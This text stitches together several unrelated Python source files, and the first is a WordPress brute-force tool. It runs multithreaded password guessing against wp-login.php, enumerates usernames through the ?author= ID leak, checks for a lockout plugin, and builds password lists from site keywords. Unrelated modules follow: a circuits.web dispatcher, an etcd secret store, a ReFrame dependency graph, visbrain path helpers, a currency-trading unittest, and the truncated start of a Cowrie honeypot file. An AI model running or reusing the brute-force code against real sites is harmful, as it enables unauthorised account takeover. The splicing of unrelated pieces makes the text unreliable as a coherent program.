            task_queue.put(wpworker.WpTaskPluginCheck(config.wp_base_url, config.script_path, config.proxy, name=plugin))
        del plugins_list

    # check for Login LockDown plugin and load login tasks into tasks queue
    logger.debug("Checking for Login LockDown plugin")
    if wp.check_loginlockdown():
        logger.warning("Login LockDown plugin is active, bruteforce will be useless")
    else:
        # load login check tasks into queue
        logger.debug("Loading wordlist...")
        wordlist = [username.strip() for username in usernames]
        try:
            [wordlist.append(w.strip()) for w in open(config.wordlist, "r").readlines()]
        except IOError:
            logger.error("Can't open '%s' the wordlist will not be used!", config.wordlist)
        logger.debug("%s words loaded from %s", str(len(wordlist)), config.wordlist)
        if args.nokeywords:
            # load into wordlist additional keywords from blog main page
            wordlist.append(wplib.filter_domain(urlparse.urlparse(wp.get_base_url()).hostname))     # add domain name to the queue
            [wordlist.append(w.strip()) for w in wp.find_keywords_in_url(config.min_keyword_len, config.min_frequency, config.ignore_with)]
        logger.info("%s passwords will be tested", str(len(wordlist)*len(usernames)))
        for username in usernames:
            for password in wordlist:
                task_queue.put(wpworker.WpTaskLogin(config.wp_base_url, config.script_path, config.proxy, username=username, password=password, task_queue=task_queue))
        del wordlist

    # start workers
    logger.info("Starting workers...")
    for i in range(config.threads):
        t = wpworker.WpbfWorker(task_queue)
        t.start()

    # feedback to stdout
    while task_queue.qsize() > 0:
        try:
            # poor ETA implementation
            start_time = time.time()
            start_queue = task_queue.qsize()
            time.sleep(10)
            delta_time = time.time() - start_time
            current_queue = task_queue.qsize()
            delta_queue = start_queue - current_queue
            try:
                wps = delta_time / delta_queue
            except ZeroDivisionError:
                wps = 0.6
            print str(current_queue)+" tasks left / "+str(round(1 / wps, 2))+" tasks per second / "+str( round(wps*current_queue / 60, 2) )+"min left"
        except KeyboardInterrupt:
            logger.info("Clearing queue and killing threads...")
            task_queue.queue.clear()
            for t in threading.enumerate()[1:]:
                t.join()

"""
wpbf WordPress library

Copyright 2011 Andres Tarantini (atarantini@gmail.com)

This file is part of wpbf.

wpbf is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

wpbf is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with wpbf.  If not, see <http://www.gnu.org/licenses/>.
"""
import urllib, urllib2, re, logging
from random import randint
from urlparse import urlparse

def rm_duplicates(seq):
    """Remove duplicates from a list

    This Function have been made by Dave Kirby and taken from site http://www.peterbe.com/plog/uniqifiers-benchmark

    >>> rm_duplicates([1, 2, 3, 3, 4])
    [1, 2, 3, 4]
    """
    seen = set()
    return [x for x in seq if x not in seen and not seen.add(x)]

def filter_domain(domain):
    """ Strips TLD and ccTLD (ex: .com, .ar, etc) from a domain name

    >>> filter_domain("www.dominio.com.ar")
    'dominio'
    """
    words = [".com", "www.", ".ar", ".cl", ".py", ".org", ".net", ".mx", ".bo", ".gob", ".gov", ".edu"]
    for word in words:
        domain = domain.replace(word, "")
    return domain

def get_keywords(data, min_keyword_len=3, min_frequency=2):
    """Get relevant keywords from text

    data            -- Input text to be indexed
    min_keyword_len -- Filter keywords that doesn't have this minimum length
    min_frequency   -- Filter keywords by the number of times than a keyword appear
    """
    words = [w for w in data.split() if len(w) > min_keyword_len]
    keywords = {}
    for word in words:
        if word in keywords:
            keywords[word] += 1
        else:
            keywords[word] = 1

    for keyword, frequency in keywords.copy().iteritems():
        if frequency < min_frequency:
            del keywords[keyword]

    return [k for k, v in keywords.iteritems()]

class Wp:
    """Perform actions on a WordPress Blog.

    Do things in a WordPress blog including login, username check/enumeration, keyword search and plugin detection.

    base_url          -- URL of the blog's main page
    login_script_path -- Path relative to base_url where the login form is located
    proxy             -- URL for a HTTP Proxy
    """
    _base_url = ''
    _login_script_path = ''
    _login_url = ''
    _proxy = None
    _version = None
    _arguments = _keywords = []
    _cache = {}

    def __init__(self, base_url, login_script_path="wp-login.php", proxy=None, *arguments, **keywords):
        # Basic filters for the base url
        self._base_url = base_url
        if self._base_url[0:7] != 'http://':
            self._base_url = 'http://'+self._base_url
        if self._base_url[-1] != '/':
            self._base_url = self._base_url+'/'

        self._login_script_path = login_script_path.lstrip("/")
        self._proxy = proxy
        self._login_url = urllib.basejoin(self._base_url, self._login_script_path)
        self._arguments = arguments
        self._keywords = keywords

        self.logger = logging.getLogger("wpbf")

    # Getters

    def get_login_url(self):
        """Returns login URL"""
        return self._login_url

    def get_base_url(self):
        """Returns base URL"""
        return self._base_url

    def get_version(self):
        """Returns WordPress version"""
        return self._version

    # General methods

    def request(self, url, params=[], cache=False, data=True):
        """Request an URL with a given parameters and proxy

        url    -- URL to request
        params -- dictionary with POST variables
        cache  -- True if you want request to be cached and get a cached version of the request
        data   -- If false, return request object, else return data. Cached data must be retrived with data=True
        """
        if cache and data and self._cache.has_key(url) and len(params) is 0:
            self.logger.debug("Cached %s %s", url, params)
            return self._cache[url]

        request = urllib2.Request(url)
        request.add_header("User-agent", "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1")
        if self._proxy:
            proxy_handler = urllib2.ProxyHandler({'http': self._proxy})
            opener = urllib2.build_opener(proxy_handler)
        else:
            opener = urllib2.build_opener()
        self.logger.debug("Requesting %s %s", url, params)
        try:
            response = opener.open(request, urllib.urlencode(params))
            response_data = response.read()
        except urllib2.HTTPError:
            return False                    

        if cache and data and len(params) is 0:
            self._cache[url] = response_data

        if data:
            return response_data

        return response


    # WordPress specific methods

    def login(self, username, password):
        """Try to login into WordPress and see in the returned data contains login errors

        username -- Wordpress username
        password -- Password for the supplied username
        """
        data = self.request(self._login_url, [('log', username), ('pwd', password)])
        if data:
            if "ERROR" in data or "Error" in data or "login_error" in data or "incorrect" in data.lower():
                return False                    
            return True
        return False                    

    def check_username(self, username):
        """Try to login into WordPress and check in the returned data contains username errors

        username -- Wordpress username
        """
        data = self.request(self._login_url, [('log', username), ('pwd', str(randint(1, 9999999)))])
        if data:
            if "ERROR" in data or "Error" in data or "login_error" in data:
                if "usuario es incorrecto" in data or 'usuario no' in data or "Invalid username" in data:
                    return False                    
                return True
        return False                    

    def find_username(self, url=False):
        """Try to find a suitable username searching for common strings used in templates that refers to authors of blog posts

        url   -- Any URL in the blog that can contain author references
        """
        if url:
            data =  self.request(url, cache=True)
        else:
            data =  self.request(self._base_url, cache=True)
        username = None

        regexps = [
            '/author/(.*)"',
            '/author/(.*?)/feed',
            'entries of (.*)"',
            'by (.*) Feed"',
            '(<!-- by (.*?) -->)',
            'View all posts by (.*)"',
        ]

        while username is None and len(regexps):
            regexp = regexps.pop()
            match = re.search(regexp, data, re.IGNORECASE)
            if match:
                username = match.group(1)
                # self.logger.debug("regexp %s marched %s", regexp, username) # uncoment to debug regexps

        if username:
            username = username.strip().replace("/","")
            self.logger.debug("Possible username %s (by content)", username)
            return username
        else:
            return False                    

    def enumerate_usernames(self, gap_tolerance=0):
        """Enumerate usernames

        Enumerate usernames using TALSOFT-2011-0526 advisory (http://seclists.org/fulldisclosure/2011/May/493) present in
        WordPress > 3.2-beta2, if no redirect is done try to match username from title of the user's archive page or page content.

        gap_tolerance -- Tolerance for user id gaps in the user id sequence (this gaps are present when users are deleted and new users created)
        """
        uid = 0
        usernames = []
        gaps = 0
        while gaps <= gap_tolerance:
            try:
                uid = uid + 1
                url = self._base_url+"?author="+str(uid)
                request = urllib2.Request(url)
                request.add_header("User-agent", "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1")
                if self._proxy:
                    proxy_handler = urllib2.ProxyHandler({"http": self._proxy})
                    opener = urllib2.build_opener(proxy_handler)
                else:
                    opener = urllib2.build_opener()
                self.logger.debug("Requesting %s", url)
                response = opener.open(request)
                data = response.read()
                self._cache[url] = data     # save response in cache
                parsed_response_url = urlparse(response.geturl())
                response_path = parsed_response_url.path
                # Check for author in redirection
                if 'author' in response_path:
                    # A redirect was made and the username is exposed. The username is the last part of the
                    # response_path (sometimes the response path can contain a trailing slash)
                    if response_path[-1] is "/":
                        username = response_path.split("/")[-2]
                    else:
                        username = response_path.split("/")[-1]
                    self.logger.debug("Possible username %s (by redirect)", username)
                    usernames.append(username)
                    redirect = True
                    gaps = 0

                # Check for author in title
                username_title = self.get_user_from_title(data)
                if username_title and username_title not in usernames:
                    usernames.append(username_title)
                    gaps = 0

                # Check for author in content
                username_content = self.find_username(url)
                if username_content and username_content not in usernames:
                    usernames.append(username_content)
                    gaps = 0

            except urllib2.HTTPError, e:
                self.logger.debug(e)
                gaps += 1

            gaps += 1

        return [user for user in usernames if self.check_username(user)]

    def get_user_from_title(self, content):
        """Fetch the contents of the <title> tag and returns a username (usually, the first word)

        content    -- html content
        last_title -- last title found
        """
        # There was no redirection but the user ID seems to exists (because not 404) so we will
        # try to find the username as the first word in the title
        title_search = re.search("<title>(.*)</title>", content, re.IGNORECASE)
        if title_search:
            title =  title_search.group(1)
            # If the title is the same than the last title requested, or empty, there are no new users
            if (self._cache.has_key('title') and title == self._cache['title']) or ' ' not in title:
                return False                    
            else:
                self._cache['title'] = title
                username = title.split()[0]
                self.logger.debug("Possible username %s (by title)", username)
                return username
        else:
                return False                    

    def find_keywords_in_url(self, min_keyword_len=3, min_frequency=2, ignore_with=False):
        """Try to find relevant keywords within the given URL, keywords will be used in the password wordlist

        min_keyword_len -- Filter keywords that doesn't have this minimum length
        min_frequency   -- Filter keywords number of times than a keyword appears within the content
        ignore_with     -- Ignore words that contains any characters in this list
        """
        data =  self.request(self._base_url, cache=True)
        keywords = []

        # get keywords from title
        title = re.search('<title>(.*)</title>', data, re.IGNORECASE)
        if title:
            title = title.group(1)
            [keywords.insert(0, kw.lower()) for kw in title.split(" ")][:-1]

        # get keywords from url content
        [keywords.append(k.strip()) for k in get_keywords(re.sub("<.*?>", "", data), min_keyword_len, min_frequency)]

        # filter keywords
        keywords = rm_duplicates([k.lower().strip().strip(",").strip("?").strip('"') for k in keywords if len(k) > min_keyword_len])    # min leght
        if ignore_with and len(ignore_with) > 0:        # ignore keywords with certain characters
            for keyword in keywords[:]:
                for i in ignore_with:
                    if i in keyword:
                        keywords.remove(keyword)
                        break

        return keywords

    def check_loginlockdown(self):
        """Check if "Login LockDown" plugin is active (Alip Aswalid)

        url   -- Login form URL
        proxy -- URL for a HTTP Proxy
        """
        data = self.request(self._login_url, cache=True)
        if data and "lockdown" in data.lower():
            return True
        else:
            return False                    

    def check_plugin(self, plugin):
        """Try to fetch WordPress version from "generator" meta tag in main page

        return - WordPress version or false if not found
        """
        url = self._base_url+"wp-content/plugins/"+plugin
        data = self.request(url)
        if data is not False:
            return True
        else:
            return False                    

    def find_plugins(self, url=False):
        """Try to find plugin names from content

        url   -- Any URL in the blog that can contain plugin paths
        """
        if url:
            data =  self.request(url, cache=True)
        else:
            data =  self.request(self._base_url, cache=True)

        plugins = re.findall(r"wp-content/plugins/(.*)/.*\.*\?.*[\'|\"]\w", data, re.IGNORECASE)

        if len(plugins):
            self.logger.debug("Possible plugins %s present", plugins)
            return plugins
        else:
            return False                    

    def fingerprint(self):
        """Try to fetch WordPress version from "generator" meta tag in main page

        return - WordPress version or false if not found
        """
        data = self.request(self._base_url, cache=True)
        m = re.search('<meta name="generator" content="[Ww]ord[Pp]ress (\d\.\d\.?\d?)" />', data)
        if m:
            self._version = m.group(1)
            return self._version
        else:
            return False                    

# Module:   dispatcher
# Date:     13th September 2007
# Author:   James Mills, prologic at shortcircuit dot net dot au

"""Dispatcher

This module implements a basic URL to Channel dispatcher.
This is the default dispatcher used by circuits.web
"""

try:
    from urllib import quote, unquote
except ImportError:
    from urllib.parse import quote, unquote  # NOQA

from circuits.six import text_type

from circuits import handler, BaseComponent, Event

from circuits.web.utils import parse_qs
from circuits.web.events import response
from circuits.web.errors import httperror
from circuits.web.processors import process
from circuits.web.controllers import BaseController


class Dispatcher(BaseComponent):

    channel = "web"

    def __init__(self, **kwargs):
        super(Dispatcher, self).__init__(**kwargs)

        self.paths = dict()

    def resolve_path(self, paths, parts):

        def rebuild_path(url_parts):
            return '/%s' % '/'.join(url_parts)

        left_over = []

        while parts:
            if rebuild_path(parts) in self.paths:
                yield rebuild_path(parts), left_over
            left_over.insert(0, parts.pop())

        if '/' in self.paths:
            yield '/', left_over

    def resolve_methods(self, parts):
        if parts:
            method = parts[0]
            vpath = parts[1:]
            yield method, vpath

        yield 'index', parts

    def find_handler(self, req):
        def get_handlers(path, method):
            component = self.paths[path]
            return component._handlers.get(method, None)

        def accepts_vpath(handlers, vpath):
            args_no = len(vpath)
            return all(len(h.args) == args_no or h.varargs for h in handlers)                    

        # Split /hello/world to ['hello', 'world']
        starting_parts = [x for x in req.path.strip("/").split("/") if x]

        for path, parts in self.resolve_path(self.paths, starting_parts):
            if get_handlers(path, req.method):
                return req.method, path, parts

            for method, vpath in self.resolve_methods(parts):
                handlers = get_handlers(path, method)
                if handlers and (not vpath or accepts_vpath(handlers, vpath)):
                    req.index = (method == 'index')
                    return method, path, vpath

        return None, None, None

    @handler("registered", channel="*")
    def _on_registered(self, component, manager):
        if (isinstance(component, BaseController) and component.channel not
                in self.paths):
            self.paths[component.channel] = component

    @handler("unregistered", channel="*")
    def _on_unregistered(self, component, manager):
        if (isinstance(component, BaseController) and component.channel in
                self.paths):
            del self.paths[component.channel]

    @handler("request", priority=0.1)
    def _on_request(self, event, req, res, peer_cert=None):
        if peer_cert:
            event.peer_cert = peer_cert

        name, channel, vpath = self.find_handler(req)

        if name is not None and channel is not None:
            event.kwargs = parse_qs(req.qs)
            process(req, event.kwargs)

            if vpath:
                event.args += tuple(vpath)

            if isinstance(name, text_type):
                name = str(name)

            return self.fire(
                Event.create(
                    name, *event.args, **event.kwargs
                ),
                channel
            )

    @handler("request_value_changed")
    def _on_request_value_changed(self, value):
        if value.handled:
            return

        req, res = value.event.args[:2]
        if value.result and not value.errors:
            res.body = value.value
            self.fire(response(res))
        elif value.promise:
            value.event.notify = True
        else:
            # This possibly never occurs.
            self.fire(httperror(req, res, error=value.value))

# Copyright (C) 2015  Custodia Project Contributors - see LICENSE file

from __future__ import print_function

import os
import sys

import etcd

from custodia.store.interface import CSStore, CSStoreError, CSStoreExists


def log_error(error):
    print(error, file=sys.stderr)


class EtcdStore(CSStore):

    def __init__(self, config):
        self.server = config.get('etcd_server', '127.0.0.1')
        self.port = int(config.get('etcd_port', 4001))
        self.namespace = config.get('namespace', "/custodia")

        # Initialize the DB by trying to create the default table
        try:
            self.etcd = etcd.Client(self.server, self.port)
            self.etcd.write(self.namespace, None, dir=True)
        except etcd.EtcdNotFile:
            # Already exists
            pass
        except etcd.EtcdException as err:
            log_error("Error creating namespace %s: [%r]" % (self.namespace,
                                                             repr(err)))
            raise CSStoreError('Error occurred while trying to init db')

    def get(self, key):
        try:
            result = self.etcd.get(os.path.join(self.namespace, key))                    
        except etcd.EtcdException as err:
            log_error("Error fetching key %s: [%r]" % (key, repr(err)))
            raise CSStoreError('Error occurred while trying to get key')
        return result.value

    def set(self, key, value, replace=False):
        path = os.path.join(self.namespace, key)                    
        try:
            self.etcd.write(path, value, prevExist=replace)
        except etcd.EtcdAlreadyExist as err:
            raise CSStoreExists(str(err))
        except etcd.EtcdException as err:
            log_error("Error storing key %s: [%r]" % (key, repr(err)))
            raise CSStoreError('Error occurred while trying to store key')

    def span(self, key):
        path = os.path.join(self.namespace, key)                    
        try:
            self.etcd.write(path, None, dir=True, prevExist=False)
        except etcd.EtcdAlreadyExist as err:
            raise CSStoreExists(str(err))
        except etcd.EtcdException as err:
            log_error("Error storing key %s: [%r]" % (key, repr(err)))
            raise CSStoreError('Error occurred while trying to store key')

    def list(self, keyfilter='/'):
        path = os.path.join(self.namespace, keyfilter)                    
        if path != '/':
            path = path.rstrip('/')
        try:
            result = self.etcd.read(path, recursive=True)
        except etcd.EtcdKeyNotFound:
            return None
        except etcd.EtcdException as err:
            log_error("Error listing %s: [%r]" % (keyfilter, repr(err)))
            raise CSStoreError('Error occurred while trying to list keys')

        value = set()
        for entry in result.get_subtree():
            if entry.key == path:
                continue
            name = entry.key[len(path):]
            if entry.dir and not name.endswith('/'):
                name += '/'
            value.add(name.lstrip('/'))
        return sorted(value)

    def cut(self, key):
        try:
            self.etcd.delete(os.path.join(self.namespace, key))                    
        except etcd.EtcdKeyNotFound:
            return False
        except etcd.EtcdException as err:
            log_error("Error removing key %s: [%r]" % (key, repr(err)))
            raise CSStoreError('Error occurred while trying to cut key')
        return True

#
# Test case graph functionality
#

import collections
import itertools

import reframe as rfm
from reframe.core.exceptions import DependencyError


def build_deps(cases):
    """Build dependency graph from test cases.

    The graph is represented as an adjacency list in a Python dictionary
    holding test cases. The dependency information is also encoded inside each
    test cases.
    """

    # Index cases for quick access
    cases_by_part = {}
    cases_revmap = {}
    for c in cases:
        cname = c.check.name
        pname = c.partition.fullname
        ename = c.environ.name
        cases_by_part.setdefault((cname, pname), [])
        cases_revmap.setdefault((cname, pname, ename), None)
        cases_by_part[cname, pname].append(c)
        cases_revmap[cname, pname, ename] = c

    def resolve_dep(target, from_map, *args):
        errmsg = 'could not resolve dependency: %s' % target
        try:
            ret = from_map[args]
        except KeyError:
            raise DependencyError(errmsg)                    
        else:
            if not ret:
                raise DependencyError(errmsg)                    

            return ret

    # NOTE on variable names
    #
    # c stands for check or case depending on the context
    # p stands for partition
    # e stands for environment
    # t stands for target

    graph = {}
    for c in cases:
        graph[c] = c.deps
        cname = c.check.name
        pname = c.partition.fullname
        ename = c.environ.name
        for dep in c.check.user_deps():
            tname, how, subdeps = dep
            if how == rfm.DEPEND_FULLY:
                c.deps.extend(resolve_dep(c, cases_by_part, tname, pname))
            elif how == rfm.DEPEND_BY_ENV:
                c.deps.append(resolve_dep(c, cases_revmap,
                                          tname, pname, ename))
            elif how == rfm.DEPEND_EXACT:
                for env, tenvs in subdeps.items():
                    if env != ename:
                        continue

                    for te in tenvs:
                        c.deps.append(resolve_dep(c, cases_revmap,
                                                  tname, pname, te))

    return graph


def print_deps(graph):
    for c, deps in graph.items():
        print(c, '->', deps)


def validate_deps(graph):
    """Validate dependency graph."""

    # Reduce test case graph to a test name only graph; this disallows
    # pseudo-dependencies as follows:
    #
    # (t0, e1) -> (t1, e1)
    # (t1, e0) -> (t0, e0)
    #
    # This reduction step will result in a graph description with duplicate
    # entries in the adjacency list; this is not a problem, cos they will be
    # filtered out during the DFS traversal below.
    test_graph = {}
    for case, deps in graph.items():
        test_deps = [d.check.name for d in deps]
        try:
            test_graph[case.check.name] += test_deps
        except KeyError:
            test_graph[case.check.name] = test_deps

    # Check for cyclic dependencies in the test name graph
    visited = set()
    unvisited = list(                    
        itertools.zip_longest(test_graph.keys(), [], fillvalue=None)                    
    )
    path = []
    while unvisited:                    
        node, parent = unvisited.pop()                    
        while path and path[-1] != parent:                    
            path.pop()                    

        adjacent = reversed(test_graph[node])                    
        path.append(node)                    
        for n in adjacent:                    
            if n in path:                    
                cycle_str = '->'.join(path + [n])                    
                raise DependencyError(                    
                    'found cyclic dependency between tests: ' + cycle_str)                    

            if n not in visited:                    
                unvisited.append((n, node))                    

        visited.add(node)                    


"""Set of functions for path definitions."""
import logging
import os
import sys

logger = logging.getLogger('visbrain')


__all__ = ['path_to_visbrain_data', 'get_files_in_folders', 'path_to_tmp',
           'clean_tmp', 'get_data_url_path']


def path_to_visbrain_data(file=None, folder=None):
    """Get the path to the visbrain_data folder.

    Parameters
    ----------
    folder : string | None
        Folder name.
    file : string | None
        File name. If None, only the path to the visbrain_data folder is
        returned.

    Returns
    -------
    path : string
        Path to the file or to the visbrain_data.
    """
    vb_path = os.path.join(os.path.expanduser('~'), 'visbrain_data')
    folder = '' if not isinstance(folder, str) else folder
    vb_path = os.path.join(vb_path, folder)
    if not os.path.exists(vb_path):
        os.makedirs(vb_path)
        logger.info("visbrain_data has been added to %s" % vb_path)
    file = '' if not isinstance(file, str) else file
    return os.path.join(vb_path, file)


def get_data_url_path():
    """Get the path to the data_url JSON file."""
    path_file = str(sys.modules[__name__].__file__)                    
    url_path = os.path.dirname(os.path.dirname(path_file))                    
    return os.path.join(url_path, 'data_url.json')                    


def get_files_in_folders(*args, with_ext=False, with_path=False, file=None,
                         exclude=None, sort=True, unique=True):
    """Get all files in several folders.

    Parameters
    ----------
    args : string
        Path to folders.
    with_ext : bool | False
        Specify if returned files should contains extensions.
    with_path : bool | False
        Specify if returned files should contains full path to it.
    file : string | None
        Specify if a specific file name is needed.
    exclude : list | None
        List of patterns to exclude
    sort : bool | True
        Sort the resulting list of files.
    unique : bool | True
        Get a unique list of files.

    Returns
    -------
    files : list
        List of files in selected folders if no file is provided. If file is a
        string, return the path to it, None if the file doesn't exist.
    """
    # Search the file :
    files = []
    if isinstance(file, str):
        import glob
        for k in args:
            if os.path.exists(k):
                files += glob.glob(os.path.join(k, file))
        return files
    # Get the list of files :
    for k in args:
        if os.path.exists(k):
            if with_path:
                files += [os.path.join(k, i) for i in os.listdir(k)]
            else:
                files += os.listdir(k)
    # Keep only a selected file :
    if isinstance(file, str) and (file in files):
        files = [files[files.index(file)]]
    # Return either files with full path or only file name :
    if not with_ext:
        files = [os.path.splitext(k)[0] for k in files]
    # Patterns to exclude :
    if isinstance(exclude, (list, tuple)):
        from itertools import product
        files = [k for k, i in product(files, exclude) if i not in k]
    # Unique :
    if unique:
        files = list(set(files))
    # Sort list :
    if sort:
        files.sort()
    return files


def path_to_tmp(file=None, folder=None):
    """Get the path to the tmp folder."""
    tmp_path = os.path.join(path_to_visbrain_data(), 'tmp')
    if not os.path.exists(tmp_path):
        os.mkdir(tmp_path)
    folder = '' if not isinstance(folder, str) else folder
    file = '' if not isinstance(file, str) else file
    tmp_path = os.path.join(tmp_path, folder)
    if not os.path.exists(tmp_path):
        os.mkdir(tmp_path)
    return os.path.join(tmp_path, file)


def clean_tmp():
    """Clean the tmp folder."""
    tmp_path = os.path.join(path_to_visbrain_data(), 'tmp')
    if os.path.exists(tmp_path):
        import shutil
        shutil.rmtree(tmp_path)

import unittest
from src.graph import *


test_offers = [{
  'offers': [
    {'contact_ign': 'KnifeySpooneyClaw', 'conversion_rate': 0.0893, 'stock': 153}
  ],
  'want': 'Chaos',
  'have': 'Alteration',
  'league': 'Abyss'
}, {
  'offers': [
    {'contact_ign': '_ZEUS___', 'conversion_rate': 0.0909, 'stock': 10},
    {'contact_ign': 'MVP_Kefir', 'conversion_rate': 0.087, 'stock': 20}
  ],
  'want': 'Chaos',
  'have': 'Chromatic',
  'league': 'Abyss'
}, {
  'offers': [
    {'contact_ign': 'wreddnuy', 'conversion_rate': 12.0, 'stock': 24},
    {'contact_ign': 'Corailthedog', 'conversion_rate': 11.0, 'stock': 2}
  ],
  'want': 'Alteration',
  'have': 'Chaos',
  'league': 'Abyss'
}, {
  'offers': [
    {'contact_ign': 'Azure_Dragon', 'conversion_rate': 1.0101, 'stock': 4261},
    {'contact_ign': 'Marcvz_GreenAgain', 'conversion_rate': 0.7143, 'stock': 222}
  ],
    'want': 'Alteration',
    'have': 'Chromatic',
    'league': 'Abyss'
}, {
  'offers': [
    {'contact_ign': 'The_Dank_Fire_God', 'conversion_rate': 11.5, 'stock': 106},
    {'contact_ign': 'MinerinoAbysss', 'conversion_rate': 11.1, 'stock': 322}
  ],
  'want': 'Chromatic',
  'have': 'Chaos',
  'league': 'Abyss'
}, {
  'offers': [
    {'contact_ign': 'Ashkeri', 'conversion_rate': 0.7143, 'stock': 449},
    {'contact_ign': 'Shioua_ouah', 'conversion_rate': 0.6897, 'stock': 1576}
  ],
  'want': 'Chromatic',
  'have': 'Alteration',
  'league': 'Abyss'
}]

expected_graph = {
  'Chaos': {
    'Alteration': [
      {'contact_ign': 'wreddnuy', 'conversion_rate': 12.0, 'stock': 24},
      {'contact_ign': 'Corailthedog', 'conversion_rate': 11.0, 'stock': 2}
    ],
    'Chromatic': [
      {'contact_ign': 'The_Dank_Fire_God', 'conversion_rate': 11.5, 'stock': 106},
      {'contact_ign': 'MinerinoAbysss', 'conversion_rate': 11.1, 'stock': 322}
    ]
  },
  'Alteration': {
    'Chaos': [
      {'contact_ign': 'KnifeySpooneyClaw', 'conversion_rate': 0.0893, 'stock': 153}
    ],
    'Chromatic': [
      {'contact_ign': 'Ashkeri', 'conversion_rate': 0.7143, 'stock': 449},
      {'contact_ign': 'Shioua_ouah', 'conversion_rate': 0.6897, 'stock': 1576}
    ]
  },
  'Chromatic': {
    'Chaos': [
      {'contact_ign': '_ZEUS___', 'conversion_rate': 0.0909, 'stock': 10},
      {'contact_ign': 'MVP_Kefir', 'conversion_rate': 0.087, 'stock': 20}
    ],
    'Alteration': [
      {'contact_ign': 'Azure_Dragon', 'conversion_rate': 1.0101, 'stock': 4261},
      {'contact_ign': 'Marcvz_GreenAgain', 'conversion_rate': 0.7143, 'stock': 222}
    ]
  }
}



### Below structures are modified for simpler testing => number reduced, offers slightly changed


# Exptected graph when trading from Chaos to Chaos over one other currency
expected_graph_small = {
  'Chaos': {
    'Alteration': [
      {'contact_ign': 'wreddnuy', 'conversion_rate': 12.0, 'stock': 100}
    ]
  },
  'Alteration': {
    'Chromatic': [
      {'contact_ign': 'Ashkeri', 'conversion_rate': 0.7143, 'stock': 449},
      {'contact_ign': 'Shioua_ouah', 'conversion_rate': 0.6897, 'stock': 1576}
    ]
  },
  'Chromatic': {
    'Chaos': [
      {'contact_ign': '_ZEUS___', 'conversion_rate': 0.0909, 'stock': 100},
      {'contact_ign': 'MVP_Kefir', 'conversion_rate': 0.087, 'stock': 200}
    ]
  }
}

# Expected paths from Chaos to Chaos
def expected_paths_small_same_currency():
  return [
    [
      {'contact_ign': 'wreddnuy', 'conversion_rate': 12.0, 'stock': 100, 'have': 'Chaos', 'want': 'Alteration'},
      {'contact_ign': 'Shioua_ouah', 'conversion_rate': 0.6897, 'stock': 1576, 'have': 'Alteration', 'want': 'Chromatic'},
      {'contact_ign': 'MVP_Kefir', 'conversion_rate': 0.087, 'stock': 200, 'have': 'Chromatic', 'want': 'Chaos'}
    ], [
      {'contact_ign': 'wreddnuy', 'conversion_rate': 12.0, 'stock': 100, 'have': 'Chaos', 'want': 'Alteration'},
      {'contact_ign': 'Shioua_ouah', 'conversion_rate': 0.6897, 'stock': 1576, 'have': 'Alteration', 'want': 'Chromatic'},
      {'contact_ign': '_ZEUS___', 'conversion_rate': 0.0909, 'stock': 100, 'have': 'Chromatic', 'want': 'Chaos'}
    ], [
      {'contact_ign': 'wreddnuy', 'conversion_rate': 12.0, 'stock': 100, 'have': 'Chaos', 'want': 'Alteration'},
      {'contact_ign': 'Ashkeri', 'conversion_rate': 0.7143, 'stock': 449, 'have': 'Alteration', 'want': 'Chromatic'},
      {'contact_ign': 'MVP_Kefir', 'conversion_rate': 0.087, 'stock': 200, 'have': 'Chromatic', 'want': 'Chaos'}
    ], [
      {'contact_ign': 'wreddnuy', 'conversion_rate': 12.0, 'stock': 100, 'have': 'Chaos', 'want': 'Alteration'},
      {'contact_ign': 'Ashkeri', 'conversion_rate': 0.7143, 'stock': 449, 'have': 'Alteration', 'want': 'Chromatic'},
      {'contact_ign': '_ZEUS___', 'conversion_rate': 0.0909, 'stock': 100, 'have': 'Chromatic', 'want': 'Chaos'}
    ]
  ]


# Expected paths from Chaos to Chromatics
# This is not really relevant to us, since we only care about trade paths between the same currency in order to
# guarantee easily comparable results. However, it's good to make sure that the path exploration also works for this
# edge case
expected_paths_small_different_currency = [                    
  [
    {'contact_ign': 'wreddnuy', 'conversion_rate': 12.0, 'stock': 100, 'have': 'Chaos', 'want': 'Alteration'},
    {'contact_ign': 'Shioua_ouah', 'conversion_rate': 0.6897, 'stock': 1576, 'have': 'Alteration', 'want': 'Chromatic'}
  ], [
    {'contact_ign': 'wreddnuy', 'conversion_rate': 12.0, 'stock': 100, 'have': 'Chaos', 'want': 'Alteration'},
    {'contact_ign': 'Ashkeri', 'conversion_rate': 0.7143, 'stock': 449, 'have': 'Alteration', 'want': 'Chromatic'}
  ]
]


expected_conversion = {
  "from": "Chaos",
  "to": "Chaos",
  "starting": 8,
  "ending": 5,
  "winnings": -3,
  "transactions": [{
    "contact_ign": "wreddnuy",
    "from": "Chaos",
    "to": "Alteration",
    "paid": 8,
    "received": 96                    
  }, {
    "contact_ign": "Shioua_ouah",
    "from": "Alteration",
    "to": "Chromatic",
    "paid": 96,
    "received": 66                    
  }, {
    "contact_ign": "MVP_Kefir",
    "from": "Chromatic",
    "to": "Chaos",
    "paid": 66,
    "received": 5                    
  }]
}


class GraphTest(unittest.TestCase):
  def test_build_graph(self):
    graph = build_graph(test_offers)
    self.assertDictEqual(graph, expected_graph)

  def test_find_paths(self):
    paths_small_same_currency = find_paths(expected_graph_small, 'Chaos', 'Chaos')
    self.assertListEqual(expected_paths_small_same_currency(), paths_small_same_currency)                    
    paths_small_different_currency = find_paths(expected_graph_small.copy(), 'Chaos', 'Chromatic')
    self.assertListEqual(expected_paths_small_different_currency, paths_small_different_currency)                    

  def test_is_profitable(self):
    path = expected_paths_small_same_currency()[0]
    self.assertEqual(False, is_profitable(path))

  def test_build_conversions(self):
    path = expected_paths_small_same_currency()[0]
    conversion = build_conversion(path)
    print(conversion)
    self.assertDictEqual(expected_conversion, conversion)

# Copyright (c) 2009-2014 Upi Tamminen <desaster@gmail.com>
# See the COPYRIGHT file for more information

"""
This module contains ...
"""

from __future__ import division, absolute_import

try:
    import cPickle as pickle
except:
    import pickle

import os
import time
import fnmatch
import hashlib
import re
import stat
import errno

from twisted.python import log

from cowrie.core.config import CONFIG

PICKLE = pickle.load(open(CONFIG.get('honeypot', 'filesystem_file'), 'rb'))

A_NAME, \
    A_TYPE, \
